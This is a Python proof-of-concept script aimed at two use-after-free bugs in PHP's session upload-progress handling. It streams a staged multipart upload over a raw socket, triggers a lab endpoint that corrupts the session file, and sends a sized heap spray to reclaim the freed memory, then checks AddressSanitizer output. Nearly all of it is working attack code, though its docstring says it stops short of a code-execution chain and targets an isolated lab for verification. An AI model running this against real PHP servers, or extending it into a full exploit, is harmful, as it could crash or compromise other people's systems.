#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VERIFICATION PoC (crash / ASAN detection) for the two UAFs in
php_session_rfc1867_progress described in the reference image:
  Bug 1 (CVE-2026-109619): post_bytes_processed is cached ONLY on the first
        FILE_START and never refreshed on later FILE_STARTs.
  Bug 2 (CVE-2026-109618): current_file_bytes_processed is refreshed on EVERY
        FILE_START but persists across the chunks of ONE file; the
        current_file[]/files[] arrays end up referenced twice at refcount 1
        (add_assoc_zval_ex / add_next_index_zval are ZVAL_COPY_VALUE without
        addref), so the destruction of the decoded tree can free them while a
        cached bucket pointer still targets them.

SCOPE: provoke the UAF so that ASAN records it. The t[] spray uses benign
filler ('A') with the documented sizing (149 x ~296B -> 320-byte bins) to
demonstrate chunk reuse. It does NOT implement fake zvals, zend_fci_info or
a chain to system(): this is a detection PoC, not an exploit.

Choreography (two stalls, HTTP/1.1 with manual Content-Length — the PHP
embedded server does not support chunked encoding):
  PHASE A: PHP_SESSION_UPLOAD_PROGRESS field + FILE_START#1 (caches the two
          pointers) + f1 data with updates (initialize->track_init per chunk;
          freq=1 in php.ini).
  STALL 1 + mutator: the lab endpoint corrupts the session file.
  PHASE B: f2 headers -> FILE_START#2 refreshes ONLY the internal pointer
          (Bug 1 leaves the external one stale) and its update() re-reads the
          session: decode FAILURE -> php_session_cancel_decode() ->
          destroy+track_init (the window where the decoded tree is freed).
  STALL 2 + spray: the t[] fields are sent to reclaim the freed chunk.
  PHASE C: f2 data -> FILE_DATA writes through the cached pointers (potentially
          stale use). ASAN must capture it here.
  PHASE D: multipart close -> END event (write of the external pointer).

Usage:
    python3 upload_uaf_poc.py --url http://127.0.0.1:8080/ --rounds 5
    python3 upload_uaf_poc.py --mode none            # control without freeing
    python3 upload_uaf_poc.py --files 1              # single-file variant
"""

import argparse
import random
import socket
import string
import sys
import threading
import time
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    sys.exit("Missing requests: pip install requests")


def rand_sid(n=26):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def part_header(boundary, name, filename=None):
    b = boundary.encode()
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
        extra = b"Content-Type: application/octet-stream\r\n\r\n"
    else:
        extra = b"\r\n"
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n" + extra


def build_opening(boundary, progress_key, first_filename="f1.bin"):
    """Progress field (MUST come first) + headers of the first file."""
    return (
        part_header(boundary, "PHP_SESSION_UPLOAD_PROGRESS")
        + progress_key.encode() + b"\r\n"
        + part_header(boundary, "f1", first_filename)
    )


def build_spray(boundary, count, value_size, filler_char="A"):
    """t[] fields with fixed-size values (benign reclaim, no payload)."""
    b = boundary.encode()
    value = (filler_char * value_size).encode()
    out = []
    for _ in range(count):
        out.append(b"--" + b + b"\r\n")
        out.append(b'Content-Disposition: form-data; name="t[]"\r\n\r\n')
        out.append(value + b"\r\n")
    return b"".join(out)


def stream_body(url, sid, boundary, args, stall1_event, stall2_event):
    """Sent in phases over a raw socket (no chunked encoding)."""
    u = urlparse(url)
    host, port = u.hostname, u.port or 80
    path = u.path or "/"

    opening = build_opening(boundary, args.progress_key)
    f2_head = part_header(boundary, "f2", "f2.bin")
    spray = build_spray(boundary, args.spray_count, args.spray_size)
    closing = b"--" + boundary.encode() + b"--\r\n"

    total = (
        len(opening) + args.file_size + len(f2_head) + args.file2_size
        + len(spray) + len(closing)
    )

    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(args.timeout)
    try:
        sock.sendall((
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {total}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode())

        filler = b"A" * args.chunk_size

        def send_file(size, label):
            sent = 0
            while sent < size:
                n = min(args.chunk_size, size - sent)
                sock.sendall(filler[:n])
                sent += n
                if sent % (args.chunk_size * 2) == 0 and args.delay > 0:
                    time.sleep(args.delay)

        # PHASE A: progress field + f1 headers + data (progress updates run
        # while the chunks are sent)
        sock.sendall(opening)
        send_file(args.file_size, "f1")

        # STALL 1: the mutator corrupts the session file
        stall1_event.set()
        time.sleep(2.5)

        # PHASE B: f2 headers -> FILE_START#2 + the re-read update
        sock.sendall(f2_head)
        time.sleep(0.8)  # let FILE_START#2 be processed (the free window)

        # STALL 2 + spray: reclaim the freed chunk
        sock.sendall(spray)
        stall2_event.set()
        time.sleep(1.0)

        # PHASE C: f2 data -> FILE_DATA through the cached pointers
        send_file(args.file2_size, "f2")

        # PHASE D: close -> END event
        sock.sendall(closing)

        data = b""
        try:
            while True:
                buf = sock.recv(4096)
                if not buf:
                    break
                data += buf
        except socket.timeout:
            pass
        status = data.split(b"\r\n", 1)[0].decode(errors="replace") if data else "(no response)"
        return status, len(data)
    finally:
        sock.close()


def fire_mutator(mutator_url, sid, mode, times=3, interval=0.4):
    for i in range(times):
        try:
            r = requests.get(mutator_url, params={"sid": sid, "mode": mode}, timeout=5)
            print(f"    [mutator #{i+1}] mode={mode} -> {r.status_code} {r.text.strip()}")
        except requests.RequestException as e:
            print(f"    [mutator #{i+1}] error: {e}")
        time.sleep(interval)


def run_round(args, rnd):
    sid = args.sid or rand_sid()
    boundary = "----asanBoundary" + rand_sid(8)
    total_est = (
        300 + args.file_size + 120 + args.file2_size
        + args.spray_count * (args.spray_size + 80) + 40
    )
    print(f"[round {rnd}] sid={sid} ~bytes={total_est} mode={args.mode} "
          f"spray={args.spray_count}x{args.spray_size}B files=2")

    try:
        r = requests.get(args.url, cookies={"PHPSESSID": sid}, timeout=10)
        print(f"    seed: {r.status_code} {r.text.strip()}")
    except requests.RequestException as e:
        print(f"    seed: error {e}")

    stall1 = threading.Event()

    def mutator_watch():
        stall1.wait(timeout=args.timeout)
        if args.mode != "none":
            fire_mutator(args.mutator_url, sid, args.mode, times=args.mutator_times)
        else:
            print("    [mutator] disabled (--mode none)")

    threading.Thread(target=mutator_watch, daemon=True).start()

    try:
        status, n = stream_body(args.url, sid, boundary, args, stall1, threading.Event())
        print(f"    upload: {status} ({n} bytes)")
    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"    upload: connection reset -> possible worker crash: {e.__class__.__name__}")
    except (socket.timeout, TimeoutError):
        print("    upload: timeout waiting for the response")
    except OSError as e:
        print(f"    upload: OSError: {e}")

    time.sleep(0.5)


def main():
    ap = argparse.ArgumentParser(description="UAF PoC for php_session_rfc1867_progress (ASAN verification)")
    ap.add_argument("--url", default="http://127.0.0.1:8080/")
    ap.add_argument("--mutator-url", default="http://127.0.0.1:8080/_lab_mutator.php")
    ap.add_argument("--sid", default=None, help="fixed PHPSESSID (optional)")
    ap.add_argument("--progress-key", default="cve2026",
                    help="value of PHP_SESSION_UPLOAD_PROGRESS")
    ap.add_argument("--mode", choices=["corrupt", "delete", "destroy", "none"],
                    default="corrupt", help="mutator action during stall 1")
    ap.add_argument("--mutator-times", type=int, default=3)
    ap.add_argument("--file-size", type=int, default=1_000_000,
                    help="size of f1 (sent in full before stall 1)")
    ap.add_argument("--file2-size", type=int, default=500_000,
                    help="size of f2 (the FILE_DATA events after stall 2)")
    ap.add_argument("--chunk-size", type=int, default=65_536)
    ap.add_argument("--delay", type=float, default=0.1)
    # Documented sizing: 149 elements -> nTableSize 256 -> strings that land
    # in 320-byte bins (24B zend_string header + ~296B payload).
    ap.add_argument("--spray-count", type=int, default=149)
    ap.add_argument("--spray-size", type=int, default=296)
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    print("== UAF PoC for php_session_rfc1867_progress (Bug1 CVE-2026-109619 / "
          "Bug2 CVE-2026-109618) — isolated lab only ==")
    for rnd in range(1, args.rounds + 1):
        run_round(args, rnd)

    print("\n== Done. Check the ASAN report with: ==")
    print("   docker logs php-uaf-lab 2>&1 | grep -B5 -A45 'AddressSanitizer'")


if __name__ == "__main__":
    main()
